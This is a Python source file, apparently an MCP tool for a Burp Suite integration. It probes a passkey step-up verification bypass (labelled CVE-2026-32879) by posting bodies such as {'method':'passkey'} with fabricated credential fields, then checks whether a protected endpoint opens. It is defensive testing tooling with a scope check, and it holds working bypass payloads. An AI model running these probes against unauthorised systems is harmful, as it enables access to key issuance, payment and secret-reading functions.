"""probe_passkey_stepup_bypass — CVE-2026-32879 class.

Universal step-up verification flows accept POST body `{"method":"passkey"}`
as proof-of-presence on the basis that the account *has* a passkey on file,
without actually performing a WebAuthn challenge/response. The vulnerable
server marks the secure-verification session complete and gates protected
endpoints (key issuance, settings, payment confirm, channel-secret read)
behind that bogus marker.

Operator supplies:
  - stepup_url: the step-up endpoint (usually a POST that expects WebAuthn proof)
  - protected_url: an endpoint that is gated by step-up — used to confirm
    the bypass worked (200 with sensitive data instead of 403/redirect-to-stepup)
  - session auth (cookies / bearer) — the test account MUST already have a
    passkey registered, otherwise the server may legitimately reject the
    request and the bypass cannot be tested

Returns VerdictResult (W7 schema):
  - CONFIRMED — server returns a verified-marker on the canonical body OR
    the protected_url subsequently returns 200 with sensitive data
  - SUSPECTED — step-up returns 200 but protected_url still requires further
    steps (partial bypass — flag to operator for manual confirmation)
  - FAILED — step-up rejects (400/401/403) or requires WebAuthn assertion
  - ERROR — missing auth, network failure, scope reject
"""

from __future__ import annotations

import json

from mcp.server.fastmcp import FastMCP

from burpsuite_mcp import client
from burpsuite_mcp.tools._request_headers import apply_realistic_headers
from burpsuite_mcp.tools.testing._verdict import error_verdict, make_verdict


# Server markers indicating step-up was marked complete WITHOUT a real
# WebAuthn assertion. Matched against response body + Set-Cookie header.
_VERIFIED_MARKERS = (
    '"verified":true',
    '"verified": true',
    '"step_up":"passed"',
    '"step_up": "passed"',
    '"secure_verification":true',
    '"secure_verification": true',
    "verified=1",
    "secure_verification_token=",
    "stepup_verified=true",
)

# Server markers indicating the server CORRECTLY required a WebAuthn assertion.
# Presence of these → FAILED (server is patched / configured correctly).
_ASSERTION_REQUIRED_MARKERS = (
    "invalid_credential",
    "credential_not_found",
    "assertion_required",
    "missing_assertion",
    "challenge_required",
    "webauthn_assertion",
    "publicKeyCredential",
)


def _build_headers(
    base_url: str,
    cookies: dict | None,
    bearer: str,
    extra: dict | None = None,
) -> dict:
    """Merge realistic Chrome 131 profile + caller auth."""
    headers = apply_realistic_headers(base_url, {})
    headers["Content-Type"] = "application/json"
    if cookies:
        # %3B escape so operator-supplied cookie values stay safe
        cookie_str = "; ".join(f"{k}={str(v).replace(';', '%3B')}"
                               for k, v in cookies.items())
        headers["Cookie"] = cookie_str
    if bearer:
        headers["Authorization"] = f"Bearer {bearer}"
    if extra:
        headers.update(extra)
    return headers


async def _send_stepup(url: str, headers: dict, body: dict) -> dict:
    """POST a JSON body to the step-up endpoint via curl_request (Burp-routed)."""
    return await client.post("/api/http/curl", json={
        "method": "POST",
        "url": url,
        "headers": headers,
        "data": json.dumps(body),
        "follow_redirects": False,
    })


async def _send_protected(url: str, headers: dict, method: str = "GET") -> dict:
    """GET the protected resource to verify the bypass actually opened the gate."""
    return await client.post("/api/http/curl", json={
        "method": method,
        "url": url,
        "headers": headers,
        "follow_redirects": False,
    })


def _classify_response(resp: dict) -> tuple[bool, bool, str]:
    """Return (looks_verified, requires_assertion, hit_marker).

    looks_verified — server returned a marker indicating bogus-bypass success
    requires_assertion — server returned a marker requiring real WebAuthn
    hit_marker — the specific string that fired (for evidence)
    """
    body = resp.get("response_body") or ""
    headers = resp.get("response_headers") or []
    haystack = body + "\n"
    for h in headers:
        if isinstance(h, dict):
            haystack += f"{h.get('name', '')}: {h.get('value', '')}\n"
        elif isinstance(h, str):
            haystack += h + "\n"

    haystack_lower = haystack.lower()
    for marker in _VERIFIED_MARKERS:
        if marker.lower() in haystack_lower:
            return True, False, marker
    for marker in _ASSERTION_REQUIRED_MARKERS:
        if marker.lower() in haystack_lower:
            return False, True, marker
    return False, False, ""


def register(mcp: FastMCP) -> None:

    @mcp.tool()
    async def probe_passkey_stepup_bypass(  # cost: low (≤5 requests)
        stepup_url: str,
        protected_url: str = "",
        bearer_token: str = "",
        cookies: dict | None = None,
        protected_method: str = "GET",
        extra_variants: bool = True,
    ) -> dict:
        """Test for CVE-2026-32879 — step-up verification bypass via `{"method":"passkey"}`.

        Probes:
          1. Canonical bypass body `{"method":"passkey"}` — if server returns
             a verified-marker or 200 without WebAuthn assertion, bypass works.
          2. (if extra_variants=True) Variants with fabricated credential_id
             and null assertion — surface servers that check field presence
             but not content.
          3. If protected_url provided, GET it after the bypass step-up:
             a 200 with sensitive-data shape (not redirect to step-up,
             not 401/403) is the canonical confirmation.

        The test account MUST have a passkey registered upstream — otherwise
        the server may legitimately reject and the bypass cannot be evaluated.

        Args:
            stepup_url: Step-up verification endpoint (POST JSON expected)
            protected_url: Optional gated endpoint to verify the bypass
                opened it. Leaving empty falls back to marker-only detection.
            bearer_token: Authenticated session bearer (or use cookies)
            cookies: Authenticated session cookies (or use bearer)
            protected_method: HTTP method for protected_url (default GET)
            extra_variants: Fire 2 additional bypass-body variants
        """
        if not bearer_token and not cookies:
            return error_verdict(
                "provide bearer_token or cookies — step-up testing needs an authenticated session with a passkey on file",
                vuln_type="passkey_stepup_bypass",
            )
        if not stepup_url:
            return error_verdict("stepup_url is required",
                                 vuln_type="passkey_stepup_bypass")

        # Scope check via the canonical helper
        scope_chk = await client.check_scope(stepup_url)
        if isinstance(scope_chk, dict):
            if "error" in scope_chk:
                return error_verdict(f"scope check failed: {scope_chk['error']}",
                                     vuln_type="passkey_stepup_bypass")
            if not scope_chk.get("in_scope", True):
                return error_verdict(f"{stepup_url} not in scope",
                                     vuln_type="passkey_stepup_bypass")

        bodies: list[dict] = [{"method": "passkey"}]
        if extra_variants:
            bodies.extend([
                {"method": "passkey", "credential_id": "AAAA"},
                {"method": "passkey", "assertion": None},
            ])

        headers = _build_headers(stepup_url, cookies, bearer_token)

        results: list[dict] = []
        logger_indices: list[int] = []
        verified_hits = 0
        assertion_required_hits = 0

        for body in bodies:
            resp = await _send_stepup(stepup_url, headers, body)
            if isinstance(resp, dict) and "error" in resp:
                results.append({"body": body, "error": resp["error"]})
                continue
            status = resp.get("status_code", 0)
            idx = resp.get("proxy_index", resp.get("history_index", -1))
            if isinstance(idx, int) and idx >= 0:
                logger_indices.append(idx)
            verified, required, marker = _classify_response(resp)
            entry = {
                "body": body,
                "status": status,
                "logger_index": idx,
                "verified_marker_hit": verified,
                "assertion_required_marker_hit": required,
                "marker": marker,
            }
            results.append(entry)
            if verified and not required:
                verified_hits += 1
            if required:
                assertion_required_hits += 1

        # If protected_url provided, GET it AFTER the canonical bypass
        protected_confirmed = False
        protected_status = 0
        protected_idx = -1
        if protected_url and verified_hits >= 1:
            proto_headers = _build_headers(protected_url, cookies, bearer_token)
            proto_resp = await _send_protected(protected_url, proto_headers,
                                               method=protected_method)
            if isinstance(proto_resp, dict) and "error" not in proto_resp:
                protected_status = proto_resp.get("status_code", 0)
                protected_idx = proto_resp.get("proxy_index",
                                               proto_resp.get("history_index", -1))
                if isinstance(protected_idx, int) and protected_idx >= 0:
                    logger_indices.append(protected_idx)
                # A 200 (or 2xx) is the strongest confirmation. Reject 30x/40x.
                protected_confirmed = 200 <= protected_status < 300

        # ── Verdict assembly ─────────────────────────────────────────────
        lines = ["probe_passkey_stepup_bypass:"]
        for r in results:
            if "error" in r:
                lines.append(f"  [{r['body']}] error: {r['error']}")
                continue
            tag = "BYPASS" if r["verified_marker_hit"] else (
                "REJECTED" if r["assertion_required_marker_hit"] else "AMBIGUOUS"
            )
            lines.append(
                f"  [{json.dumps(r['body'])}] status={r['status']} -> {tag} "
                f"(marker={r['marker']!r})"
            )
        if protected_url:
            lines.append(f"  protected_url {protected_method} {protected_url}: "
                         f"status={protected_status} "
                         f"{'CONFIRMED' if protected_confirmed else 'NOT_OPEN'} "
                         f"(logger #{protected_idx})")
        else:
            lines.append("  protected_url not supplied — marker-only detection")
        lines.append("")

        details = {
            "stepup_url": stepup_url,
            "protected_url": protected_url,
            "results": results,
            "verified_hits": verified_hits,
            "assertion_required_hits": assertion_required_hits,
            "protected_confirmed": protected_confirmed,
            "protected_status": protected_status,
        }

        # CONFIRMED: verified-marker hit AND protected_url responded 2xx
        if verified_hits >= 1 and protected_confirmed:
            lines.append("VERDICT: CONFIRMED — step-up bypass + protected endpoint opened.")
            return make_verdict(
                "CONFIRMED", 0.95,
                f"passkey step-up bypass: {verified_hits} verified-marker hit(s) + "
                f"protected endpoint returned {protected_status}",
                vuln_type="passkey_stepup_bypass",
                logger_indices=logger_indices,
                details=details,
                summary="\n".join(lines),
            )
        # CONFIRMED on marker alone if no protected_url provided
        if verified_hits >= 1 and not protected_url:
            lines.append("VERDICT: CONFIRMED (marker-only) — supply protected_url for end-to-end proof.")
            return make_verdict(
                "CONFIRMED", 0.80,
                f"passkey step-up bypass: {verified_hits} verified-marker hit(s); "
                f"protected_url not supplied for end-to-end confirmation",
                vuln_type="passkey_stepup_bypass",
                logger_indices=logger_indices,
                details=details,
                summary="\n".join(lines),
            )
        # SUSPECTED: verified marker but protected endpoint still gated
        if verified_hits >= 1 and protected_url and not protected_confirmed:
            lines.append("VERDICT: SUSPECTED — step-up returned verified-marker but protected "
                         f"endpoint still returned {protected_status}. Partial bypass or marker is decorative.")
            return make_verdict(
                "SUSPECTED", 0.55,
                f"step-up returned verified-marker but protected returned {protected_status} — "
                f"marker may be decorative",
                vuln_type="passkey_stepup_bypass",
                logger_indices=logger_indices,
                details=details,
                summary="\n".join(lines),
            )
        if assertion_required_hits >= 1:
            lines.append("VERDICT: FAILED — server correctly requires WebAuthn assertion.")
            return make_verdict(
                "FAILED", 0.10,
                f"server requires WebAuthn assertion ({assertion_required_hits} "
                f"rejection-marker hits) — not vulnerable to CVE-2026-32879",
                vuln_type="passkey_stepup_bypass",
                logger_indices=logger_indices,
                details=details,
                summary="\n".join(lines),
            )
        lines.append("VERDICT: FAILED — no verified-marker hit; server did not accept "
                     "the bypass body.")
        return make_verdict(
            "FAILED", 0.15,
            "no verified-marker hit across canonical + variant bypass bodies",
            vuln_type="passkey_stepup_bypass",
            logger_indices=logger_indices,
            details=details,
            summary="\n".join(lines),
        )
